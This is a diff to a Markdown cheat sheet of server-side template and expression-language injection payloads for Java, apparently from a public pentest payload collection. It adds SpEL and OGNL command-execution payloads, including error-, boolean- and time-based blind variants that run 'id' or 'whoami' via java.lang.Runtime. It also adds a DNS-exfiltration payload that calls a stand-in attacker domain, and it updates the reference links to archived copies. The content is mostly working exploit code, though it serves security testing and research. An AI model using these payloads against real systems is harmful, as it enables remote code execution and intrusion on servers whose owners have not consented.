@@ -35,6 +35,9 @@
     - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
     - [SpEL - Session Attributes](#spel---session-attributes)
     - [SpEL - Command Execution](#spel---command-execution)
+- [Object-Graph Navigation Language](#object-graph-navigation-language)
+    - [OGNL - Basic Injection](#ognl---basic-injection)
+    - [OGNL - Command Execution](#ognl---command-execution)
 - [References](#references)
 
 ## Templating Libraries
@@ -46,7 +49,7 @@
 | Groovy        | `${ }`                 |
 | Jinjava       | `{{ }}`                |
 | Pebble        | `{{ }}`                |
-| Spring        | `*{ }`                 |
+| SpEL          | `*{ }`, `#{ }`, `${ }` |
 | Thymeleaf     | `[[ ]]`                |
 | Velocity      | `#set($X="") $X`       |
 
@@ -367,9 +370,12 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 
 ### SpEL - Basic Injection
 
+> SpEL has built-in templating system using `#{ }`, but SpEL is also commonly used for interpolation using `${ }`.
+
 ```java
 ${7*7}
 ${'patt'.toString().replace('a', 'x')}
+${T(java.lang.Integer).valueOf('1')}
 ```
 
 ### SpEL - Retrieve Environment Variables
@@ -391,7 +397,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 DNS lookup
 
 ```java
-${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","[ATTACKER.DOMAIN.TLD]")}
 ```
 
 ### SpEL - Session Attributes
@@ -407,7 +413,7 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - Method using `java.lang.Runtime` #1 - accessed with JavaClass
 
     ```java
-    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
+    ${T(java.lang.Runtime).getRuntime().exec("whoami")}
     ```
 
 - Method using `java.lang.Runtime` #2
@@ -421,13 +427,13 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - Method using `java.lang.Runtime` #3 - accessed with `invoke`
 
     ```java
-    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
+    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
     ```
 
 - Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
 
     ```java
-    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"whoami\\\")"))}
     ```
 
 - Method using `java.lang.ProcessBuilder`
@@ -436,24 +442,84 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
     ${request.getAttribute("c").add("cmd.exe")}
     ${request.getAttribute("c").add("/k")}
-    ${request.getAttribute("c").add("ping x.x.x.x")}
+    ${request.getAttribute("c").add("whoami")}
     ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
     ${request.getAttribute("a")}
     ```
+  
+- Error-Based payload:
+  
+    ```java
+    ${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}
+    ```
+  
+- Boolean-Based payload:
+  
+    ```java
+    ${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
+    ```
+  
+- Time-Based payload:
+  
+    ```java
+    ${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}
+    ```
+
+## Object-Graph Navigation Language
+
+[Official website](https://commons.apache.org/dormant/commons-ognl/)
+
+> OGNL stands for Object-Graph Navigation Language; it is an expression language for getting and setting properties of Java objects, plus other extras such as list projection and selection and lambda expressions. You use the same expression for both getting and setting the value of a property.
+
+### OGNL - Basic Injection
+
+> OGNL can be used with different tags like `${ }`
+
+```java
+7*7
+'patt'.toString().replace('a', 'x')
+@java.lang.Integer@valueOf('1')
+```
+
+### OGNL - Command Execution
+
+Rendered:
+
+```java
+new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
+```
+
+Error-Based:
+
+```java
+(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
+```
+
+Boolean-Based:
+
+```java
+1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
+```
+
+Time-Based:
+
+```java
+((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
+```
 
 ## References
 
-- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
-- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
-- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
-- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
-- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
-- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
-- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
-- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://web.archive.org/web/20200707130000/https://securitylab.github.com/research/bean-validation-RCE)
+- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://web.archive.org/web/20230203103413/https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
+- [Expression Language Injection - OWASP - December 4, 2019](https://web.archive.org/web/20200422030628/https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
+- [Expression Language injection - PortSwigger - January 27, 2019](https://web.archive.org/web/20251215015718/https://portswigger.net/kb/issues/00100f20_expression-language-injection)
+- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://web.archive.org/web/20250219021221/https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://web.archive.org/web/20181207164702/https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
+- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://web.archive.org/web/20200923134700/https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://web.archive.org/web/20250810034644/https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
 - [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
-- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
-- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
+- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://web.archive.org/web/20150808084830/https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
+- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://web.archive.org/web/20200501162014/https://www.youtube.com/watch?v=3cT0uE7Y87s)
+- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://web.archive.org/web/20220412162651/https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
